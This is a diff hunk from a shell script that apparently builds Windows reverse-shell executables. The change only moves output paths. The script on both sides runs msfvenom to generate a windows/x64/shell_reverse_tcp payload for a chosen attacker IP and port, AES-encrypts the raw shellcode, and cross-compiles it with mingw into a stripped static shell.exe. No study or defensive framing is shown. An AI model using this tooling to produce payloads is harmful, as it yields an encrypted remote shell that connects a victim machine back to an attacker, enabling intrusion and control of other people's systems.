@@ -16,13 +16,13 @@ read -r shellpath
 
 
 echo -e ""
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port  -f raw -o $shellpath/temp.raw >/dev/null
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port  -f raw -o temp.raw >/dev/null
 cp code/revshell.cpp code/revshell2.cpp 2>/dev/null
 python2 code/aesencrypt.py temp.raw >/dev/null
-x86_64-w64-mingw32-g++ code/revshell2.cpp code/helpers.cpp -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -o shell.exe -fpermissive 2</dev/null
+x86_64-w64-mingw32-g++ code/revshell2.cpp code/helpers.cpp -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -o $shellpath/shell.exe -fpermissive 2</dev/null
 rm temp.raw
 echo -e ""
-ls shell.exe >/dev/null
+ls $shellpath/shell.exe >/dev/null
 e=$(echo $?)
 
 if [ $e == 0 ]; then
